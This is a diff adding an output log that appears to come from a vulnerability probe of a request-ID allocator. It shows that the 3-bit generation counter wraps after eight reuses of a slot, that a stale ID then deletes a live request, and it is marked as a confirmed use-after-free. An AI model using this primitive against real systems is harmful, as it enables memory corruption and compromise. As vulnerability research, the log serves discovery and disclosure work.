@@ -1,0 +1,96 @@
+=== PROBE 70a: Generation wrap-around UAF ===
+
+pid=97
+/dev/zero fd=22
+[A] ID format characterization
+  id[1] = 0x4205  slot=517  gen=2
+  id[2] = 0x0206  slot=518  gen=0
+  id[3] = 0x0207  slot=519  gen=0
+  id[4] = 0x0208  slot=520  gen=0
+  id[5] = 0x0209  slot=521  gen=0
+  id[6] = 0x020A  slot=522  gen=0
+  id[7] = 0x020B  slot=523  gen=0
+  id[8] = 0x020C  slot=524  gen=0
+  id[9] = 0x020D  slot=525  gen=0
+  id[10] = 0x020E  slot=526  gen=0
+  id[11] = 0x020F  slot=527  gen=0
+  id[12] = 0x0210  slot=528  gen=0
+  id[13] = 0x0211  slot=529  gen=0
+  id[14] = 0x0212  slot=530  gen=0
+  id[15] = 0x0213  slot=531  gen=0
+  id[16] = 0x0214  slot=532  gen=0
+  id[17] = 0x0215  slot=533  gen=0
+  id[18] = 0x0216  slot=534  gen=0
+  id[19] = 0x0217  slot=535  gen=0
+  id[20] = 0x0218  slot=536  gen=0
+  --- After delete+resubmit ---
+  resub[1] = 0x2218  slot=536  gen=1
+  resub[2] = 0x2217  slot=535  gen=1
+  resub[3] = 0x2216  slot=534  gen=1
+  resub[4] = 0x2215  slot=533  gen=1
+  resub[5] = 0x2214  slot=532  gen=1
+  resub[6] = 0x2213  slot=531  gen=1
+  resub[7] = 0x2212  slot=530  gen=1
+  resub[8] = 0x2211  slot=529  gen=1
+  resub[9] = 0x2210  slot=528  gen=1
+  resub[10] = 0x220F  slot=527  gen=1
+  LIFO match: slot 536, gen 0 -> 1 (delta=1)
+  LIFO match: slot 535, gen 0 -> 1 (delta=1)
+  LIFO match: slot 534, gen 0 -> 1 (delta=1)
+  LIFO match: slot 533, gen 0 -> 1 (delta=1)
+  LIFO match: slot 532, gen 0 -> 1 (delta=1)
+  LIFO match: slot 531, gen 0 -> 1 (delta=1)
+  LIFO match: slot 530, gen 0 -> 1 (delta=1)
+  LIFO match: slot 529, gen 0 -> 1 (delta=1)
+  LIFO match: slot 528, gen 0 -> 1 (delta=1)
+  LIFO match: slot 527, gen 0 -> 1 (delta=1)
+
+[B] Generation wrap-around test
+  TARGET: id=0x420F slot=527 gen=2
+  TARGET deleted
+  cycle 1: id=0x620F slot=527 gen=3 *** SAME SLOT ***
+  cycle 2: id=0x820F slot=527 gen=4 *** SAME SLOT ***
+  cycle 3: id=0xA20F slot=527 gen=5 *** SAME SLOT ***
+  cycle 4: id=0xC20F slot=527 gen=6 *** SAME SLOT ***
+  cycle 5: id=0xE20F slot=527 gen=7 *** SAME SLOT ***
+  cycle 6: id=0x020F slot=527 gen=0 *** SAME SLOT ***
+  cycle 7: id=0x220F slot=527 gen=1 *** SAME SLOT ***
+  cycle 8: id=0x420F slot=527 gen=2 *** SAME SLOT ***
+  *** GENERATION WRAPPED at cycle 8! gen=2 matches target ***
+  cycle 9: id=0x620F slot=527 gen=3 *** SAME SLOT ***
+  cycle 10: id=0x820F slot=527 gen=4 *** SAME SLOT ***
+  cycle 11: id=0xA20F slot=527 gen=5 *** SAME SLOT ***
+  cycle 12: id=0xC20F slot=527 gen=6 *** SAME SLOT ***
+  cycle 13: id=0xE20F slot=527 gen=7 *** SAME SLOT ***
+  cycle 14: id=0x020F slot=527 gen=0 *** SAME SLOT ***
+  cycle 15: id=0x220F slot=527 gen=1 *** SAME SLOT ***
+  WRAP: id=0x420F slot=527 gen=2
+  *** WRAP ID MATCHES TARGET ID EXACTLY ***
+  wrap_id == target_id: true
+
+[C] Stale ID deletion attempt
+  Attempting 662(0x420F) on wrap request's slot...
+  stale delete status: 0x00000000
+  *** DELETE SUCCEEDED ON STALE ID ***
+  wrap_id poll after stale delete: 0x80020003
+  wrap_id wait after stale delete: 0x80020003
+  *** CONFIRMED: wrap request FREED by stale ID deletion ***
+  *** THIS IS THE UAF MECHANISM ***
+  wrap_id delete status: 0x80020003
+
+[D] Extended wrap test: padding to force slot reuse
+  padding: 5 requests occupying slots
+  TARGET2: id=0x4214 slot=532 gen=2
+  D cycle 1: slot=532 gen=3 (target slot, delta=1)
+  D cycle 2: slot=532 gen=4 (target slot, delta=2)
+  D cycle 3: slot=532 gen=5 (target slot, delta=3)
+  D cycle 4: slot=532 gen=6 (target slot, delta=4)
+  D cycle 5: slot=532 gen=7 (target slot, delta=5)
+  D cycle 6: slot=532 gen=0 (target slot, delta=6)
+  D cycle 7: slot=532 gen=1 (target slot, delta=7)
+  D cycle 8: slot=532 gen=2 (target slot, delta=0)
+  *** GENERATION WRAPPED BACK TO ORIGINAL ***
+  stale delete(0x4214) = 0x00000000
+  live poll(0x4214) = 0x80020003  *** UAF CONFIRMED ***
+
+=== PROBE 70a COMPLETE ===
